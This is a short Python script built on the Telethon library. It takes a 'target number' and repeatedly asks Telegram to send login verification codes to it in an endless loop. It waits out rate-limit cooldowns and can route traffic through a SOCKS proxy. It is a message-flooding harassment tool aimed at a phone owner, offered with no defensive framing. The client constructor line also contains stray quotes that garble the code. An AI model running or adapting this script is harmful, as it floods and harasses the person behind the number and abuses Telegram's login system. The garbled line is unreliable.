from telethon import TelegramClient
from telethon.sessions import MemorySession
import socks
import asyncio
import re

async def send_code(number):
    proxy = { # use your proxy if you want
        'proxy_type': socks.SOCKS5,
        'addr': '127.0.0.1',
        'port': 1234,
        'username': 'username',
        'password': 'password'
    }
    
    client = TelegramClient(MemorySession(), 6, 'eb06d4abfb49dc3eeb1aeb98ae0f581e'''', proxy=proxy''')
    try:
        await client.connect()
        await client.send_code_request(number)
        print('sent verification code')
        
    except Exception as e:
        print(f'error: {str(e)}')
        if 'A wait of' in str(e):
            wait_time = int(re.search(r'(\d+)', str(e)).group(1))
            print(f'cooldown: {wait_time}')
            await asyncio.sleep(wait_time)
            return True
    finally:
        await client.disconnect()
    return False

async def main():
    number = input('target number: ')
    while True:
        retry = await send_code(number)
        if not retry:
            await asyncio.sleep(10)

if __name__ == '__main__':
    asyncio.run(main())